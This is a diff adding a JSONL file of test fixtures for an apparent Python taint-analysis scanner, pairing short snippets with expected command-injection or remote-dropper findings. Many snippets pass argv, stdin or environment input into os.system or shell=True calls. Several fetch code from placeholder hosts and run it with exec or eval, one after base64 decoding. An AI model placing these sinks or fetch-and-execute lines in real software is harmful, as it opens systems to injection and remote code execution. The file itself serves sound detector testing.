@@ -1,0 +1,258 @@
+{"name":"test_argv_into_os_system","code":"import os, sys\nos.system(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_argv_into_subprocess_shell_true","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=True)\n","vector":"SXV-008","count":1}
+{"name":"test_env_into_shell","code":"import os, subprocess\nsubprocess.call(os.getenv('X'), shell=True)\n","vector":"SXV-008","count":1}
+{"name":"test_intermediate_assignment_and_fstring","code":"import os, sys\nname = sys.argv[1]\ncmd = f'echo {name}'\nos.system(cmd)\n","vector":"SXV-008","count":1}
+{"name":"test_argparse_namespace_attribute","code":"import argparse, os\np = argparse.ArgumentParser()\nargs = p.parse_args()\nos.system(args.target)\n","vector":"SXV-008","count":1}
+{"name":"test_interprocedural_positional_binding","code":"import os, sys\ndef run(x):\n    os.system(x)\nrun(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_requests_text_into_exec","code":"import requests\nexec(requests.get('http://x').text)\n","vector":"SXV-018","count":1}
+{"name":"test_urlopen_read_into_shell","code":"import urllib.request, subprocess\np = urllib.request.urlopen('http://x')\nsubprocess.run(p.read().decode(), shell=True)\n","vector":"SXV-018","count":1}
+{"name":"test_constant_command_is_clean","code":"import os\nos.system('ls -la')\n","vector":null,"count":0}
+{"name":"test_list_form_without_shell_is_clean","code":"import subprocess, sys\nsubprocess.run(['echo', sys.argv[1]])\n","vector":null,"count":0}
+{"name":"test_shlex_quote_without_posix_sink_proof_remains_tainted","code":"import os, sys, shlex\nos.system('echo ' + shlex.quote(sys.argv[1]))\n","vector":"SXV-008","count":1}
+{"name":"test_constant_dict_lookup_is_clean","code":"import os, sys\nTABLE = {'a': 'ls', 'b': 'pwd'}\nos.system(TABLE[sys.argv[1]])\n","vector":null,"count":0}
+{"name":"test_network_only_parsed_not_executed","code":"import requests\ndata = requests.get('http://x').json()\nprint(data)\n","vector":null,"count":0}
+{"name":"test_subprocess_list_argv_no_shell_even_with_network","code":"import subprocess, requests\nsubprocess.run(['echo', requests.get('http://x').text])\n","vector":null,"count":0}
+{"name":"test_finding_carries_flow_evidence","code":"import os, sys\nos.system(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_deterministic","code":"import os, sys\nos.system(sys.argv[1])\nos.system(sys.argv[2])\n","vector":"SXV-008","count":2}
+{"name":"test_sink_inside_class_method","code":"import os, sys\nclass Runner:\n    def run(self):\n        os.system(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_sink_inside_nested_function","code":"import os, sys\ndef outer():\n    def inner():\n        os.system(sys.argv[1])\n    inner()\n","vector":"SXV-008","count":1}
+{"name":"test_method_interprocedural_is_not_followed","code":"import os, sys\nclass C:\n    def run(self, x):\n        os.system(x)\n    def go(self):\n        self.run(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_subprocess_keyword_args_sink","code":"import subprocess, sys\nsubprocess.run(args=sys.argv[1], shell=True)\n","vector":"SXV-008","count":1}
+{"name":"test_list_built_from_input_then_indexed_is_not_declassified","code":"import os, sys\ncmd = ['sh', '-c', sys.argv[1]]\nos.system(cmd[2])\n","vector":"SXV-008","count":1}
+{"name":"test_return_value_taint_through_helper","code":"import os, sys\ndef g():\n    return sys.argv[1]\nos.system(g())\n","vector":"SXV-008","count":1}
+{"name":"test_helper_returning_constant_stays_clean","code":"import os\ndef g():\n    return 'ls -la'\nos.system(g())\n","vector":null,"count":0}
+{"name":"test_same_named_method_does_not_evict_top_level_flow","code":"import os, sys\ndef deploy():\n    os.system(sys.argv[1])\nclass Ops:\n    def deploy(self):\n        pass\n","vector":"SXV-008","count":1}
+{"name":"test_method_call_does_not_misresolve_across_classes","code":"import os, sys\nclass Safe:\n    def handle(self, x):\n        return x.upper()\nclass Danger:\n    def handle(self, x):\n        os.system(x)\ns = Safe()\ns.handle(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_return_taint_does_not_misresolve_across_classes","code":"import os, sys\nclass A:\n    def fetch(self):\n        return 'safe'\nclass B:\n    def fetch(self):\n        return sys.argv[1]\na = A()\nos.system(a.fetch())\n","vector":null,"count":0}
+{"name":"test_same_named_method_does_not_evict_laundering_helper","code":"import os, sys\ndef g():\n    return sys.argv[1]\nos.system(g())\nclass C:\n    def g(self):\n        return 'x'\n","vector":"SXV-008","count":1}
+{"name":"test_method_on_unrelated_stdlib_object_is_not_a_flow","code":"import os, sys, smtplib\nclass Cmd:\n    def send(self, x):\n        os.system(x)\nconn = smtplib.SMTP('h')\nconn.send(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_return_launder_on_unrelated_object_is_not_a_flow","code":"import os, sys, socket\nclass A:\n    def fetch(self):\n        return sys.argv[1]\nc = socket.socket()\nos.system(c.fetch())\n","vector":null,"count":0}
+{"name":"test_nested_helper_return_launder_is_caught","code":"import os, sys\ndef outer():\n    def h():\n        return sys.argv[1]\n    os.system(h())\nouter()\n","vector":"SXV-008","count":1}
+{"name":"test_nested_helper_positional_bind_is_caught","code":"import os, sys\ndef outer():\n    def h(x):\n        os.system(x)\n    h(sys.argv[1])\nouter()\n","vector":"SXV-008","count":1}
+{"name":"test_rebound_self_does_not_resolve","code":"import os, sys\nclass C:\n    def handle(self):\n        self = self.backend\n        os.system(self.command())\n    def command(self):\n        return sys.argv[1]\n","vector":null,"count":0}
+{"name":"test_staticmethod_self_reference_does_not_resolve","code":"import os, sys\nclass C:\n    @staticmethod\n    def handle():\n        os.system(self.command())\n    def command(self):\n        return sys.argv[1]\n","vector":null,"count":0}
+{"name":"test_walrus_rebound_self_does_not_resolve","code":"import os, sys\nclass C:\n    def h(self):\n        x = (self := self.backend)\n        os.system(self.command())\n    def command(self):\n        return sys.argv[1]\n","vector":null,"count":0}
+{"name":"test_for_target_rebound_self_does_not_resolve","code":"import os, sys\nclass C:\n    def h(self):\n        for self in self.backends:\n            os.system(self.command())\n    def command(self):\n        return sys.argv[1]\n","vector":null,"count":0}
+{"name":"test_match_capture_rebound_self_no_false_positive","code":"import os, sys\nclass C:\n    def run(self, o):\n        match o:\n            case _ as self:\n                self.m(sys.argv[1])\n    def m(self, c):\n        os.system(c)\n","vector":null,"count":0}
+{"name":"test_import_as_self_no_false_positive","code":"import os, sys\nclass C:\n    def run(self):\n        import shutil as self\n        self.m(sys.argv[1])\n    def m(self, c):\n        os.system(c)\n","vector":null,"count":0}
+{"name":"test_dict_constant_key_carries_taint","code":"import os, sys\nd = {'cmd': sys.argv[1]}\nos.system(d['cmd'])\n","vector":"SXV-008","count":1}
+{"name":"test_dict_get_constant_key_carries_taint","code":"import os, sys\nd = {'cmd': sys.argv[1]}\nos.system(d.get('cmd'))\n","vector":"SXV-008","count":1}
+{"name":"test_dict_untainted_key_stays_clean","code":"import os, sys\nd = {'safe': 'ls', 'u': sys.argv[1]}\nos.system(d['safe'])\n","vector":null,"count":0}
+{"name":"test_tainted_dict_dynamic_key_fires","code":"import os, sys\nd = {'cmd': sys.argv[1]}\nk = 'cmd'\nos.system(d[k])\n","vector":"SXV-008","count":1}
+{"name":"test_json_network_index_is_remote_dropper","code":"import os, requests\ndata = requests.get('http://127.0.0.1/x').json()\nos.system(data['cmd'])\n","vector":"SXV-018","count":1}
+{"name":"test_starred_splat_argument_propagates","code":"import os, sys\ndef run(x):\n    os.system(x)\nrun(*[sys.argv[1]])\n","vector":"SXV-008","count":1}
+{"name":"test_positional_only_param_binds","code":"import os, sys\ndef run(cmd, /):\n    os.system(cmd)\nrun(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_positional_only_param_does_not_misbind","code":"import os, sys\ndef run(cmd, /, safe):\n    os.system(safe)\nrun(sys.argv[1], 'ls')\n","vector":null,"count":0}
+{"name":"test_keyword_argument_binds","code":"import os, sys\ndef run(cmd):\n    os.system(cmd)\nrun(cmd=sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_positional_only_not_keyword_bindable","code":"import os, sys\ndef run(cmd, /):\n    os.system(cmd)\nrun(cmd=sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_splat_binds_by_position_not_first_param","code":"import os, sys\ndef run(a, b):\n    os.system(a)\nrun(*['safe', sys.argv[1]])\n","vector":null,"count":0}
+{"name":"test_splat_single_element_still_fires","code":"import os, sys\ndef run(x):\n    os.system(x)\nrun(*[sys.argv[1]])\n","vector":"SXV-008","count":1}
+{"name":"test_tuple_unpack_taints_only_the_tainted_target","code":"import os, sys\nsafe, cmd = ('ls', sys.argv[1])\nos.system(safe)\n","vector":null,"count":0}
+{"name":"test_tuple_unpack_still_taints_the_tainted_target","code":"import os, sys\nsafe, cmd = ('ls', sys.argv[1])\nos.system(cmd)\n","vector":"SXV-008","count":1}
+{"name":"test_annotated_reassignment_clears_taint","code":"import os, sys\nx = sys.argv[1]\nx: str = 'ls'\nos.system(x)\n","vector":null,"count":0}
+{"name":"test_analyzer_abort_is_high_check_error","code":"pass\n","vector":null,"count":0}
+{"name":"test_dict_subscript_assignment_taints","code":"import os, sys\nd = {}\nd['cmd'] = sys.argv[1]\nos.system(d['cmd'])\n","vector":"SXV-008","count":1}
+{"name":"test_dict_subscript_overwrite_with_constant_clears","code":"import os, sys\nd = {}\nd['cmd'] = sys.argv[1]\nd['cmd'] = 'ls'\nos.system(d['cmd'])\n","vector":null,"count":0}
+{"name":"test_const_table_reassigned_to_tainted_fires","code":"import os, sys\nT = {'x': 'ls'}\nT = [sys.argv[1]]\nos.system(T[0])\n","vector":"SXV-008","count":1}
+{"name":"test_helper_return_evidence_points_at_source_line","code":"import os, sys\ndef g():\n    return sys.argv[1]\nos.system(g())\n","vector":"SXV-008","count":1}
+{"name":"test_subprocess_shell_truthy_int_fires","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=1)\n","vector":"SXV-008","count":1}
+{"name":"test_stdin_readline_is_a_source","code":"import os, sys\nos.system(sys.stdin.readline())\n","vector":"SXV-008","count":1}
+{"name":"test_conditional_shlex_quote_without_platform_proof_remains_tainted","code":"import os, shlex, sys\narg = sys.argv[1]\nif arg:\n    arg = shlex.quote(arg)\n    os.system('run ' + arg)\n","vector":"SXV-008","count":1}
+{"name":"test_reassign_to_constant_in_block_no_false_positive","code":"import os, sys\nx = sys.argv[1]\nif x:\n    x = 'safe'\n    os.system('run ' + x)\n","vector":null,"count":0}
+{"name":"test_default_then_override_else_branch_no_false_positive","code":"import os, sys\ntarget = 'default'\nif len(sys.argv) > 1:\n    target = sys.argv[1]\nelse:\n    os.system('run ' + target)\n","vector":null,"count":0}
+{"name":"test_except_branch_does_not_see_try_assignment","code":"import os, sys\nt = 'd'\ntry:\n    t = sys.argv[1]\nexcept Exception:\n    os.system('run ' + t)\n","vector":null,"count":0}
+{"name":"test_flow_sensitive_fix_keeps_real_flows","code":"import os, sys\nx = sys.argv[1]\nif x:\n    os.system('run ' + x)\n","vector":"SXV-008","count":1}
+{"name":"test_for_loop_target_is_tainted","code":"import subprocess, sys\nfor a in sys.argv[1:]:\n    subprocess.call(a, shell=True)\n","vector":"SXV-008","count":1}
+{"name":"test_generator_comprehension_forwards_taint","code":"import os, sys\nos.system(' '.join(a for a in sys.argv))\n","vector":"SXV-008","count":1}
+{"name":"test_bare_os_environ_is_a_source","code":"import os\nos.system(os.environ['CMD'])\n","vector":"SXV-008","count":1}
+{"name":"test_list2cmdline_propagates_not_declassifies","code":"import subprocess, os, sys\nos.system(subprocess.list2cmdline(sys.argv))\n","vector":"SXV-008","count":1}
+{"name":"test_try_else_runs_after_body_and_sees_its_taint","code":"import os, sys\nt = 'd'\ntry:\n    t = sys.argv[1]\nexcept Exception:\n    pass\nelse:\n    os.system(t)\n","vector":"SXV-008","count":1}
+{"name":"test_handler_sees_assignment_completed_before_raise","code":"import os, sys\ncmd = 'safe'\ntry:\n    cmd = sys.argv[1]\n    raise RuntimeError()\nexcept RuntimeError:\n    os.system(cmd)\n","vector":"SXV-008","count":1}
+{"name":"test_finally_applies_to_handler_path","code":"import os, sys\ncmd = 'safe'\ntry:\n    work()\nexcept Exception:\n    cmd = sys.argv[1]\nfinally:\n    final = cmd\nos.system(final)\n","vector":"SXV-008","count":1}
+{"name":"test_finally_clears_taint_on_every_path","code":"import os, sys\ncmd = sys.argv[1]\ntry:\n    work()\nexcept Exception:\n    cmd = sys.argv[2]\nfinally:\n    cmd = 'safe'\nos.system(cmd)\n","vector":null,"count":0}
+{"name":"test_returned_branch_does_not_taint_post_join_sink","code":"import os, sys\ndef run(enabled):\n    cmd = 'safe'\n    if enabled:\n        cmd = sys.argv[1]\n        return\n    os.system(cmd)\n","vector":null,"count":0}
+{"name":"test_loop_break_skips_clean_else_and_reaches_post_loop_sink","code":"import os, sys\ncmd = 'safe'\nfor item in items:\n    cmd = sys.argv[1]\n    break\nelse:\n    cmd = 'safe'\nos.system(cmd)\n","vector":"SXV-008","count":1}
+{"name":"test_returned_loop_path_does_not_taint_post_loop_sink","code":"import os, sys\ndef run(items):\n    cmd = 'safe'\n    for item in items:\n        cmd = sys.argv[1]\n        return\n    os.system(cmd)\n","vector":null,"count":0}
+{"name":"test_match_capture_carries_subject_taint","code":"import os, sys\nmatch sys.argv[1]:\n    case cmd:\n        os.system(cmd)\n","vector":"SXV-008","count":1}
+{"name":"test_match_capture_clears_stale_taint","code":"import os, sys\ncmd = sys.argv[1]\nmatch 'safe':\n    case cmd:\n        os.system(cmd)\n","vector":null,"count":0}
+{"name":"test_match_cases_do_not_share_assignments","code":"import os, sys\ncmd = 'safe'\nmatch mode:\n    case 1:\n        cmd = sys.argv[1]\n    case 2:\n        os.system(cmd)\n","vector":null,"count":0}
+{"name":"test_failed_match_guard_assignment_reaches_later_case","code":"import os, sys\nmatch 1:\n    case 1 if (cmd := sys.argv[1]) and False:\n        pass\n    case _:\n        os.system(cmd)\n","vector":"SXV-008","count":1}
+{"name":"test_exhaustive_match_reassignment_clears_stale_taint","code":"import os, sys\ncmd = sys.argv[1]\nmatch object():\n    case _:\n        cmd = 'safe'\nos.system(cmd)\n","vector":null,"count":0}
+{"name":"test_with_target_clears_stale_taint","code":"import os, sys\ncmd = sys.argv[1]\nwith open('log') as cmd:\n    os.system(cmd)\n","vector":null,"count":0}
+{"name":"test_aliased_os_system_fires","code":"import os as o, sys\no.system(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_from_import_alias_sink_fires","code":"from os import system as sh\nimport sys\nsh(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_subprocess_getoutput_alias_fires","code":"import subprocess as sp, sys\nsp.getoutput(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_getstatusoutput_from_import_fires","code":"from subprocess import getstatusoutput as g\nimport sys\ng(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_builtins_eval_network_fires","code":"import builtins, requests\nbuiltins.eval(requests.get('http://e').text)\n","vector":"SXV-018","count":1}
+{"name":"test_user_defined_system_stays_clean","code":"import sys\ndef system(x):\n    return None\nsystem(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_unrelated_object_run_shell_true_stays_clean","code":"import sys\nclass Worker:\n    def run(self, x, shell=False):\n        return None\nWorker().run(sys.argv[1], shell=True)\n","vector":null,"count":0}
+{"name":"test_execl_shell_form_fires","code":"import os, sys\nos.execl('/bin/sh', 'sh', '-c', sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_posix_spawn_shell_form_fires","code":"import os, sys\nos.posix_spawn('/bin/sh', ['sh', '-c', sys.argv[1]], {})\n","vector":"SXV-008","count":1}
+{"name":"test_execv_list_shell_form_fires","code":"import os, sys\nos.execv('/bin/sh', ['sh', '-c', sys.argv[1]])\n","vector":"SXV-008","count":1}
+{"name":"test_venv_reexec_without_dash_c_stays_clean","code":"import os, sys\npy = '/venv/bin/python'\nos.execv(py, [py] + sys.argv)\n","vector":null,"count":0}
+{"name":"test_split_propagation_fires","code":"import os, sys\nos.system(sys.argv[1].split()[0])\n","vector":"SXV-008","count":1}
+{"name":"test_json_load_network_fires","code":"import os, json\nfrom urllib.request import urlopen\nd = json.load(urlopen('http://e'))\nos.system(d['c'])\n","vector":"SXV-018","count":1}
+{"name":"test_base64_remote_dropper_fires","code":"import base64, requests\nexec(base64.b64decode(requests.get('http://e').text))\n","vector":"SXV-018","count":1}
+{"name":"test_dict_get_scalar_taint_fires","code":"import os, requests\nd = requests.get('http://e').json()\nos.system(d.get('cmd'))\n","vector":"SXV-018","count":1}
+{"name":"test_iterating_stdin_fires","code":"import os, sys\nfor line in sys.stdin:\n    os.system(line)\n","vector":"SXV-008","count":1}
+{"name":"test_stdin_buffer_read_fires","code":"import os, sys\nos.system(sys.stdin.buffer.read())\n","vector":"SXV-008","count":1}
+{"name":"test_parse_known_args_fires","code":"import argparse, subprocess\np = argparse.ArgumentParser()\na, _ = p.parse_known_args()\nsubprocess.run(a.x, shell=True)\n","vector":"SXV-008","count":1}
+{"name":"test_walrus_in_sink_fires","code":"import os, sys\nos.system(cmd := sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_walrus_in_if_condition_fires","code":"import os, sys\nif (cmd := sys.argv[1]):\n    os.system(cmd)\n","vector":"SXV-008","count":1}
+{"name":"test_walrus_in_while_condition_fires","code":"import os, sys\nwhile (c := sys.stdin.readline()):\n    os.system(c)\n","vector":"SXV-008","count":1}
+{"name":"test_yaml_safe_load_subscript_into_shell_fires","code":"import yaml, sys, subprocess\ndoc = yaml.safe_load(sys.stdin.read())\nsubprocess.call(doc['job']['cmd'], shell=True)\n","vector":"SXV-008","count":1}
+{"name":"test_module_global_source_read_in_function_fires","code":"import os, subprocess\nEXEC_CMD = os.getenv('EXEC_CMD', '')\ndef do_exec():\n    subprocess.call(EXEC_CMD, shell=True)\ndo_exec()\n","vector":"SXV-008","count":1}
+{"name":"test_module_global_shadowed_by_param_is_clean","code":"import os, subprocess\ncmd = os.getenv('C', '')\ndef run(cmd='ls'):\n    subprocess.call(cmd, shell=True)\nrun()\n","vector":null,"count":0}
+{"name":"test_module_global_shadowed_by_local_is_clean","code":"import os, subprocess\ncmd = os.getenv('C', '')\ndef run():\n    cmd = 'ls -la'\n    subprocess.call(cmd, shell=True)\nrun()\n","vector":null,"count":0}
+{"name":"test_constant_global_in_function_is_clean","code":"import subprocess\nCMD = 'ls -la'\ndef run():\n    subprocess.call(CMD, shell=True)\nrun()\n","vector":null,"count":0}
+{"name":"test_global_assigned_twice_is_not_seeded","code":"import os, subprocess\ncmd = 'ls -la'\ndef run():\n    subprocess.call(cmd, shell=True)\nrun()\ncmd = os.getenv('EVIL')\n","vector":null,"count":0}
+{"name":"test_global_shadowed_by_except_as_is_clean","code":"import os, subprocess\ne = os.getenv('EVIL')\ndef run():\n    try:\n        pass\n    except Exception as e:\n        subprocess.call(e, shell=True)\n","vector":null,"count":0}
+{"name":"test_global_shadowed_by_local_import_is_clean","code":"import os, subprocess\ncfg = os.getenv('CFG')\ndef run():\n    from mypkg import cfg\n    subprocess.call(cfg, shell=True)\n","vector":null,"count":0}
+{"name":"test_global_shadowed_by_aliased_local_import_is_clean","code":"import os, subprocess\ncfg = os.getenv('CFG')\ndef run():\n    from mypkg import safe_cfg as cfg\n    subprocess.call(cfg, shell=True)\n","vector":null,"count":0}
+{"name":"test_nonlocal_binds_enclosing_not_global","code":"import os, subprocess\nx = os.getenv('C')\ndef outer():\n    x = 'safe'\n    def inner():\n        nonlocal x\n        subprocess.call(x, shell=True)\n    inner()\n","vector":null,"count":0}
+{"name":"test_nested_function_reads_enclosing_local_not_global","code":"import os, subprocess\ncmd = os.getenv('CMD', '')\ndef main():\n    cmd = 'safe default'\n    def worker():\n        subprocess.call(cmd, shell=True)\n    worker()\n","vector":null,"count":0}
+{"name":"test_global_rebound_by_for_target_is_not_seeded","code":"import os, subprocess\ncmd = os.getenv('C')\nfor cmd in ('ls', 'pwd'):\n    print(cmd)\ndef run():\n    subprocess.call(cmd, shell=True)\nrun()\n","vector":null,"count":0}
+{"name":"test_global_rebound_by_with_as_is_not_seeded","code":"import os, subprocess\ncmd = os.getenv('C')\nwith open('log') as cmd:\n    pass\ndef run():\n    subprocess.call(cmd, shell=True)\nrun()\n","vector":null,"count":0}
+{"name":"test_reassigned_function_is_not_followed","code":"import os, sys\ndef run(x):\n    os.system(x)\nrun = lambda x: None\nrun(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_call_uses_definition_visible_at_call_site","code":"import os, sys\ndef run(x):\n    os.system(x)\nrun(sys.argv[1])\ndef run(x):\n    print(x)\n","vector":"SXV-008","count":1}
+{"name":"test_literal_splat_then_positional_binds_next_parameter","code":"import os, sys\ndef run(a, b):\n    os.system(b)\nrun(*['safe'], sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_duplicate_positional_and_keyword_binding_is_not_executable","code":"import os, sys\ndef run(x):\n    os.system(x)\nrun('safe', x=sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_whole_dict_taint_survives_unrelated_key_overwrite","code":"import os, requests\nd = requests.get('https://example.com').json()\nd['unrelated'] = 'safe'\nos.system(d['cmd'])\n","vector":"SXV-018","count":1}
+{"name":"test_whole_dict_taint_clears_the_overwritten_key","code":"import os, requests\nd = requests.get('https://example.com').json()\nd['cmd'] = 'safe'\nos.system(d['cmd'])\n","vector":null,"count":0}
+{"name":"test_identity_helper_return_propagates","code":"import os, sys\ndef identity(x):\n    return x\nos.system(identity(sys.argv[1]))\n","vector":"SXV-008","count":1}
+{"name":"test_docstring_then_direct_identity_return_propagates","code":"import os, sys\ndef identity(x):\n    \"\"\"Return the input.\"\"\"\n    return x\nos.system(identity(sys.argv[1]))\n","vector":"SXV-008","count":1}
+{"name":"test_dead_reassignment_does_not_shadow_function","code":"import os, sys\ndef run(x):\n    os.system(x)\nif False:\n    run = lambda x: None\nrun(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_dead_function_definition_is_not_followed","code":"import os, sys\nif False:\n    def run(x):\n        os.system(x)\nrun(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_module_import_shadows_earlier_function","code":"import os, sys\ndef run(x):\n    os.system(x)\nfrom safe_module import run\nrun(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_literal_splat_overflow_is_not_executable","code":"import os, sys\ndef run(x):\n    os.system(x)\nrun(*[sys.argv[1], 'extra'])\n","vector":null,"count":0}
+{"name":"test_missing_required_argument_is_not_executable","code":"import os, sys\ndef run(x, required):\n    os.system(x)\nrun(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_dead_return_after_safe_return_is_clean","code":"import os, sys\ndef identity(x):\n    return 'safe'\n    return x\nos.system(identity(sys.argv[1]))\n","vector":null,"count":0}
+{"name":"test_conditional_callable_shadow_keeps_reachable_function","code":"import os, sys\ndef run(x):\n    os.system(x)\nif os.getenv('DISABLE'):\n    run = lambda x: None\nrun(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_zero_iteration_loop_does_not_shadow_function","code":"import os, sys\ndef run(x):\n    os.system(x)\nfor run in []:\n    pass\nrun(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_finally_override_return_is_clean","code":"import os, sys\ndef identity(x):\n    try:\n        return x\n    finally:\n        return 'safe'\nos.system(identity(sys.argv[1]))\n","vector":null,"count":0}
+{"name":"test_break_before_return_is_clean","code":"import os, sys\ndef identity(x):\n    while True:\n        break\n        return x\n    return 'safe'\nos.system(identity(sys.argv[1]))\n","vector":null,"count":0}
+{"name":"test_future_sink_import_does_not_rewrite_earlier_call","code":"import sys\ndef system(x):\n    return None\nsystem(sys.argv[1])\nfrom os import system\n","vector":null,"count":0}
+{"name":"test_function_definition_shadows_earlier_sink_import","code":"from os import system\nimport sys\ndef system(x):\n    return None\nsystem(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_object_assignment_shadows_module_sink","code":"import os, sys\nclass Safe:\n    def system(self, x):\n        return None\nos = Safe()\nos.system(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_relative_import_is_not_canonicalized_as_stdlib","code":"from .os import system\nimport sys\nsystem(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_handler_shadow_does_not_escape_try","code":"import os, sys\ndef run(x):\n    os.system(x)\ntry:\n    pass\nexcept Exception:\n    run = lambda x: None\nrun(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_handler_function_does_not_escape_try","code":"import os, sys\nrun = lambda x: None\ntry:\n    pass\nexcept Exception:\n    def run(x):\n        os.system(x)\nrun(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_handler_body_is_still_analyzed","code":"import sys\ntry:\n    raise RuntimeError()\nexcept RuntimeError:\n    from os import system\n    system(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_failed_try_import_keeps_outer_sink_alias","code":"import subprocess, sys\ncmd = sys.argv[1]\ntry:\n    import missing_dependency as subprocess\nexcept ImportError:\n    pass\nsubprocess.run(cmd, shell=True)\n","vector":"SXV-008","count":1}
+{"name":"test_varargs_element_propagates","code":"import os, sys\ndef run(*args):\n    os.system(args[0])\nrun(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_varkw_element_propagates","code":"import os, sys\ndef run(**kwargs):\n    os.system(kwargs['cmd'])\nrun(cmd=sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_nonawaited_async_identity_is_clean","code":"import os, sys\nasync def identity(x):\n    return x\nos.system(identity(sys.argv[1]))\n","vector":null,"count":0}
+{"name":"test_nonawaited_async_source_is_clean","code":"import os, sys\nasync def source():\n    return sys.argv[1]\nos.system(source())\n","vector":null,"count":0}
+{"name":"test_nonawaited_async_sink_is_clean","code":"import os, sys\nasync def run(x):\n    os.system(x)\nrun(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_literal_keyword_unpack_binds_fixed_parameter","code":"import os, sys\ndef run(cmd):\n    os.system(cmd)\nrun(**{'cmd': sys.argv[1]})\n","vector":"SXV-008","count":1}
+{"name":"test_literal_keyword_unpack_binds_varkw","code":"import os, sys\ndef run(**kwargs):\n    os.system(kwargs['cmd'])\nrun(**{'cmd': sys.argv[1]})\n","vector":"SXV-008","count":1}
+{"name":"test_literal_keyword_unpack_duplicate_is_not_executable","code":"import os, sys\ndef run(cmd):\n    os.system(cmd)\nrun(cmd='safe', **{'cmd': sys.argv[1]})\n","vector":null,"count":0}
+{"name":"test_literal_keyword_unpack_safe_value_is_clean","code":"import os\ndef run(cmd):\n    os.system(cmd)\nrun(**{'cmd': 'safe'})\n","vector":null,"count":0}
+{"name":"test_subprocess_literal_shell_argv_fires","code":"import subprocess, sys\nsubprocess.run(['sh', '-c', sys.argv[1]])\n","vector":"SXV-008","count":1}
+{"name":"test_subprocess_non_shell_argv_remains_clean","code":"import subprocess, sys\nsubprocess.run(['echo', '-c', sys.argv[1]])\n","vector":null,"count":0}
+{"name":"test_named_truthy_shell_flag_fires","code":"import subprocess, sys\nuse_shell = True\nsubprocess.run(sys.argv[1], shell=use_shell)\n","vector":"SXV-008","count":1}
+{"name":"test_named_truthy_dict_shell_flag_fires","code":"import subprocess, sys\nuse_shell = {'enabled': True}\nsubprocess.run(sys.argv[1], shell=use_shell)\n","vector":"SXV-008","count":1}
+{"name":"test_named_false_shell_flag_remains_clean","code":"import subprocess, sys\nuse_shell = False\nsubprocess.run(sys.argv[1], shell=use_shell)\n","vector":null,"count":0}
+{"name":"test_rebound_shell_flag_remains_clean","code":"import subprocess, sys\nuse_shell = True\nuse_shell = False\nsubprocess.run(sys.argv[1], shell=use_shell)\n","vector":null,"count":0}
+{"name":"test_rebound_kwargs_shell_true_fires","code":"import subprocess\nopts = {'shell': False}\nopts = {'shell': True}\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"test_unknown_augmented_literal_retains_shell_risk","code":"import subprocess\nflag = 1\nflag |= unknown()\nsubprocess.run(input(), shell=flag)\n","vector":"SXV-008","count":1}
+{"name":"test_conditional_kwargs_mutation_does_not_escape_branch","code":"import subprocess\nopts = {}\nif unknown():\n    opts.update(shell=True)\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"test_deferred_kwargs_mutation_is_not_applied","code":"import subprocess\nopts = {'shell': False}\ncallback = lambda: opts.update(shell=True)\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"test_shadowed_dict_constructor_does_not_create_shell_proof","code":"import subprocess\ndef dict(**values):\n    return values\nopts = dict(shell=True)\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"test_local_kwargs_parameter_shadows_truthy_global","code":"import subprocess\nopts = {'shell': True}\ndef launch(opts):\n    subprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"test_assigned_os_system_alias_fires","code":"import os, sys\nlaunch = os.system\nlaunch(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_rebound_os_system_alias_remains_clean","code":"import os, sys\nlaunch = os.system\nlaunch = lambda value: value\nlaunch(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_direct_constructor_method_flow_fires","code":"import os\nclass Runner:\n    def run(self, command):\n        os.system(command)\nRunner().run(input())\n","vector":"SXV-008","count":1}
+{"name":"test_direct_constructor_resolution_does_not_guess_by_method_name","code":"import os\nclass Dangerous:\n    def run(self, command):\n        os.system(command)\nclass Safe:\n    def run(self, command):\n        return command\nSafe().run(input())\n","vector":null,"count":0}
+{"name":"test_tainted_default_argument_flow_fires","code":"import os\ndef go(command=input()):\n    os.system(command)\ngo()\n","vector":"SXV-008","count":1}
